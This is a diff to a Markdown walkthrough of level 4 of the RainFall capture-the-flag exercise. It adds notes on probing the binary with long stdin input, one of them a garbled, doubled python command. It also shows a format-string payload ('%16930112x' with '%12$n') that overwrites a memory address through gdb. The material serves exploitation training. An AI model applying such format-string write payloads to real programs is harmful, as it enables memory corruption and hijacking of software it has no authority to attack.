@@ -1,3 +1,19 @@
+# level 04
+
+The program doesn't seems to wait for parameters but read `stdin` and print it to `stdout`. It doesn't looks like to segfault with large strings :
+
+```bash
+level4@RainFall:~$ python -c 'print "A" * 600' python -c 'print "A" * 10' | ./level4
+AAAAAAAAAA
+level4@RainFall:~$ python -c 'print "A" * 20' | ./level4
+AAAAAAAAAAAAAAAAAAAA
+level4@RainFall:~$ python -c 'print "A" * 200' | ./level4
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+By looking at the assembly code, we can see that the function to inspect is the `n` function.
+
+
 #Format String 2  
   
 ## Disassembled code  
@@ -17,7 +33,7 @@ You can use my 'loop\_address.py' to find the good parameter.
   
 ok. We have to replace the value of the 0x8049810 address, we proceed like the previous exercise in gdb:  
   
-r <<\<$(python -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n'")  
+r <<\<$(python -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n'")
   
 ok, it's works.  
   
